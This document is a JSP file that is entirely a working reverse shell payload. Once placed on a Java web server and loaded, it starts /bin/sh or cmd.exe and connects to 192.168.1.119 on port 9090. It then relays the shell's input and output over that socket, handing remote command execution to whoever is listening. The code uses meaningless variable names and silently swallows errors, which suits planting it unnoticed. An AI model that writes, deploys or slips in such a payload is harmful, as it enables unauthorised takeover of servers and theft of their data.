<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream yj;
    OutputStream lw;

    StreamConnector( InputStream yj, OutputStream lw )
    {
      this.yj = yj;
      this.lw = lw;
    }

    public void run()
    {
      BufferedReader ea  = null;
      BufferedWriter bll = null;
      try
      {
        ea  = new BufferedReader( new InputStreamReader( this.yj ) );
        bll = new BufferedWriter( new OutputStreamWriter( this.lw ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = ea.read( buffer, 0, buffer.length ) ) > 0 )
        {
          bll.write( buffer, 0, length );
          bll.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( ea != null )
          ea.close();
        if( bll != null )
          bll.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "192.168.1.119", 9090);
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
